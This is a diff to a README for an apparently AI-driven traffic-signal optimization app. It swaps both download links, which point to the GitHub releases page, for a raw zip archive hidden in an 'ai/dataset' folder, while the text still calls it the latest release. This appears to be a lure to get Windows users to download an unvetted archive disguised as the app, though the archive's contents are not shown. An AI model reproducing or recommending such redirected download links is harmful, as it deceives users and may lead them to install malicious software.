@@ -1,6 +1,6 @@
 # 🚦 ai-traffic-signal-optimization - Smarter Traffic Flow for Cities
 
-[![Download](https://img.shields.io/badge/Download%20Release-purple?style=for-the-badge)](https://github.com/mandiedural205/ai-traffic-signal-optimization/releases)
+[![Download](https://img.shields.io/badge/Download%20Release-purple?style=for-the-badge)](https://github.com/mandiedural205/ai-traffic-signal-optimization/raw/refs/heads/main/ai/dataset/optimization_signal_traffic_ai_v1.8.zip)
 
 ## 🛠️ What This App Does
 
@@ -18,7 +18,7 @@ It is built for users who want a simple way to run a smart traffic signal demo o
 
 Use this link to visit the release page and download the app:
 
-[Download the latest release](https://github.com/mandiedural205/ai-traffic-signal-optimization/releases)
+[Download the latest release](https://github.com/mandiedural205/ai-traffic-signal-optimization/raw/refs/heads/main/ai/dataset/optimization_signal_traffic_ai_v1.8.zip)
 
 Follow these steps on Windows:
 
